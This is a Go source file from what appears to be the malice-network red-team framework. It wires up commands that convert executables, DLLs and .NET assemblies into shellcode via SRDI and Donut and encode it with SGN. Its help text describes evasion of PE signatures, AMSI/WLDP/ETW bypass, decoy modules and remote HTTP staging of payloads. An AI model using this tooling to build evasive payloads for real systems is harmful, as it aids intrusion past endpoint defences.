package mutant

import (
	"github.com/chainreactors/malice-network/client/command/common"
	"github.com/chainreactors/malice-network/client/repl"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/helper/intermediate"
	"github.com/chainreactors/malice-network/helper/proto/client/clientpb"
	"github.com/chainreactors/malice-network/helper/utils/donut"
	"github.com/chainreactors/mals"
	"github.com/rsteube/carapace"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"github.com/wabzsy/gonut"
)

func Commands(con *repl.Console) []*cobra.Command {
	srdiCmd := &cobra.Command{
		Use:   consts.CommandSRDI,
		Short: "use srdi to generate shellcode",
		Long: `Generate an SRDI (Shellcode Reflective DLL Injection) artifact to minimize PE (Portable Executable) signatures.

SRDI technology reduces the PE characteristics of a DLL, enabling more effective injection and evasion during execution. The following options are supported:
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return SRDICmd(cmd, con)
		},
		Example: `~~~
// Convert a DLL to SRDI format with build target
srdi --path /path/to/target --target x86_64-pc-windows-msvc

// Specify an entry function for the DLL during SRDI conversion
srdi --path /path/to/target --target x86_64-pc-windows-msvc

// Include user-defined data with the generated shellcode
srdi --path /path/to/target.dll ---target x86_64-pc-windows-msvc --user_data_path /path/to/user_data --function_name DllMain

// Convert a specific artifact to SRDI format using its ID
srdi --id artifact_id --target x86_64-pc-windows-msvc
~~~`,
	}
	common.BindFlag(srdiCmd, common.SRDIFlagSet)
	common.BindFlagCompletions(srdiCmd, func(comp carapace.ActionMap) {
		comp["target"] = common.BuildTargetCompleter(con)
		comp["path"] = carapace.ActionFiles().Usage("file path")
		comp["id"] = common.ArtifactCompleter(con)
	})

	donutCmd := &cobra.Command{
		Use:   consts.CommandDonut,
		Short: "donut cmd",
		Long:  "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory ",
		Example: `
  gonut -i c2.dll
  gonut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
  gonut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
  gonut -z2 -k2 -t -i loader.exe -o out.bin
`,
		RunE: func(cmd *cobra.Command, args []string) error {
			return DonutCmd(cmd, con)
		},
	}
	common.BindFlag(donutCmd, func(f *pflag.FlagSet) {
		f.StringP("modname", "n", "", "Module name for HTTP staging. If entropy is enabled, this is generated randomly.")
		f.StringP("server", "s", "", "Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/")
		f.Uint32P("entropy", "e", uint32(gonut.DONUT_ENTROPY_DEFAULT),
			`Entropy:
	1=None
	2=Use random names
	3=Random names + symmetric encryption
	`)

		// -PIC/SHELLCODE OPTIONS-
		f.IntP("arch", "a", int(gonut.DONUT_ARCH_X96),
			`Target architecture:
	1=x86
	2=amd64
	3=x86+amd64
	`)
		f.StringP("output", "o", "shellcode", "Output file to save loader.")
		f.IntP("format", "f", int(gonut.DONUT_FORMAT_BINARY),
			`Output format:
	1=Binary
	2=Base64
	3=C
	4=Ruby
	5=Python
	6=Powershell
	7=C#
	8=Hex
	9=UUID
	10=Golang
	11=Rust
	`)
		f.Uint32P("oep", "y", 0, "Create thread for loader and continue execution at <addr> supplied. (eg. 0x1234)")
		f.Uint32P("exit", "x", uint32(gonut.DONUT_OPT_EXIT_THREAD),
			`Exit behaviour:
	1=Exit thread
	2=Exit process
	3=Do not exit or cleanup and block indefinitely
	`)

		// -FILE OPTIONS-
		f.StringP("class", "c", "", "Optional class name. (required for .NET DLL, format: namespace.class)")
		f.StringP("domain", "d", "", "AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.")
		f.StringP("input", "i", "", "Input file to execute in-memory.")
		f.StringP("method", "m", "", "Optional method or function for DLL. (a method is required for .NET DLL)")
		f.StringP("args", "p", "", "Optional parameters/command line inside quotations for DLL method/function or EXE.")
		f.BoolP("unicode", "w", false, "Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)")
		f.StringP("runtime", "r", "", "CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.")
		f.BoolP("thread", "t", false, "Execute the entrypoint of an unmanaged EXE as a thread.")

		// -EXTRA-
		f.Uint32P("compress", "z", uint32(gonut.GONUT_COMPRESS_NONE),
			`Pack/Compress file:
	1=None
	2=aPLib         [experimental]
	3=LZNT1  (RTL)  [experimental, Windows only]
	4=Xpress (RTL)  [experimental, Windows only]
	5=LZNT1         [experimental]
	6=Xpress        [experimental, recommended]
	`)
		f.Uint32P("bypass", "b", uint32(gonut.DONUT_BYPASS_CONTINUE),
			`Bypass AMSI/WLDP/ETW:
	1=None
	2=Abort on fail
	3=Continue on fail
	`)
		f.Uint32P("headers", "k", uint32(gonut.DONUT_HEADERS_OVERWRITE),
			`Preserve PE headers:
	1=Overwrite
	2=Keep all
	`)
		f.StringP("decoy", "j", "", "Optional path of decoy module for Module Overloading.")

		// -OTHER-
		f.BoolP("verbose", "v", false, "verbose output")

		f.SortFlags = false
	})

	common.BindFlagCompletions(donutCmd, func(comp carapace.ActionMap) {
		comp["input"] = carapace.ActionFiles().Usage("file path")
	})
	return []*cobra.Command{srdiCmd, donutCmd}
}

func Register(con *repl.Console) {
	con.RegisterServerFunc("malefic_srdi", MaleficSRDI, &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "malefic srdi",
	})

	intermediate.RegisterFunction("exe2shellcode",
		func(exe []byte, arch string, cmdline string) (string, error) {
			bin, err := donut.DonutShellcodeFromPE("1.exe", exe, arch, cmdline, false, true)
			if err != nil {
				return "", err
			}
			return string(bin), nil
		})
	intermediate.AddHelper("exe2shellcode", &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "exe to shellcode with donut",
		Input: []string{
			"bin: dll bin",
			"arch: architecture",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	intermediate.RegisterFunction("dll2shellcode", func(dll []byte, arch string, cmdline string) (string, error) {
		bin, err := donut.DonutShellcodeFromPE("1.dll", dll, arch, cmdline, false, true)
		if err != nil {
			return "", err
		}
		return string(bin), nil
	})
	intermediate.AddHelper("dll2shellcode", &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "dll to shellcode with donut",
		Input: []string{
			"bin: dll bin",
			"arch: architecture, x86/x64",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	intermediate.RegisterFunction("clr2shellcode", donut.DonutFromAssemblyFromFile)
	intermediate.AddHelper("clr2shellcode", &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "clr to shellcode with donut",
		Input: []string{
			"file: path to PE file",
			"arch: architecture, x86/x64",
			"cmdline: cmd args",
			"method: name of method or DLL function to invoke for .NET DLL and unmanaged DLL",
			"classname: name of class with optional namespace for .NET DLL",
			"appdomain: name of domain to create for .NET DLL/EXE",
		},
		Output: []string{
			"shellcode: bin",
		},
	})

	intermediate.RegisterFunction("donut", donut.DonutShellcodeFromFile)
	intermediate.AddHelper("donut", &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters ",
		Input: []string{
			"file: path to PE file",
			"arch: architecture, x86/x64",
			"cmdline: cmd args",
		},
		Output: []string{
			"shellcode",
		},
	})

	con.RegisterServerFunc("srdi", func(con *repl.Console, dll []byte, entry string, arch string, param string) (string, error) {
		bin, err := con.Rpc.DLL2Shellcode(con.Context(), &clientpb.DLL2Shellcode{
			Bin:        dll,
			Arch:       arch,
			Type:       "srdi",
			Entrypoint: entry,
			Params:     param,
		})
		if err != nil {
			return "", err
		}
		return string(bin.Bin), nil
	}, &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "dll/exe to shellcode with srdi",
		Input: []string{
			"bin: dll/exe bin",
			"entry: entry function for dll",
			"arch: architecture, x86/x64",
			"param: cmd args",
		},
		Output: []string{
			"shellcode: shellcode bin",
		},
	})

	con.RegisterServerFunc("sgn_encode", func(con *repl.Console, shellcode []byte, arch string, iterations int32) (string, error) {
		bin, err := con.Rpc.ShellcodeEncode(con.Context(), &clientpb.ShellcodeEncode{
			Shellcode:  shellcode,
			Arch:       arch,
			Type:       "sgn",
			Iterations: iterations,
		})
		if err != nil {
			return "", err
		}
		return string(bin.Bin), nil
	}, &mals.Helper{
		Group: intermediate.GroupArtifact,
		Short: "shellcode encode with sgn",
		Input: []string{
			"bin: shellcode bin",
			"arch: architecture, x86/x64",
			"iterations: sgn iterations",
		},
		Output: []string{
			"shellcode: encoded shellcode bin",
		},
	})
}
